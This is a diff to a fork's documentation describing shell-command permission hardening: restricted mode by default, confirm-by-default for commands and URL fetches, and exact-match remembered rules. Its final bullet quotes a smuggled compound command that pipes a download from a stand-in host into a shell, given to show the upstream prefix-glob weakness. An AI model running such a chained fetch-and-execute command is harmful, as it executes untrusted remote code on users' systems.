@@ -117,3 +117,29 @@ except for the one-character whitespace fix in
 `crates/forge_main/src/info.rs:78`. There are no behavioural, API, or
 dependency differences in the compiled `forge` binary between `main` and
 `mymain`.
+
+> **Note (2026-08-21):** the paragraph above describes the 2026-05-19
+> snapshot. Since then the fork has intentionally diverged in behaviour;
+> see the section below.
+
+## Security posture (fork divergence, 2026-08-21)
+
+The fork hardens the shell-command permission model relative to upstream
+(epic `forgecode-shell-policy-hardening`):
+
+- **Restricted mode is on by default.** The embedded defaults
+  (`crates/forge_config/.forge.toml`) set `restricted = true`, so the
+  policy engine is consulted for every tool call. Upstream defaults to
+  `restricted = false`, which disables permission checks entirely. Opt out
+  with `restricted = false` in `~/.forge/.forge.toml`.
+- **Commands and URL fetches confirm by default.** The default policy file
+  (`crates/forge_services/src/permissions.default.yaml`, materialised as
+  `permissions.yaml` on first use) maps `command: "*"` and `url: "*"` to
+  `confirm` instead of upstream's `allow`. Reads and writes stay
+  allow-all. An existing `permissions.yaml` is never rewritten, so
+  installs that predate this change keep their old (allow-all) file until
+  it is deleted or edited.
+- **"Accept and Remember" stores exact commands.** Remembering an accepted
+  command writes a glob-escaped exact-match execute rule instead of the
+  upstream `<cmd> <subcmd>*` prefix glob, which also matched compound
+  commands such as `git push; curl evil | sh`.
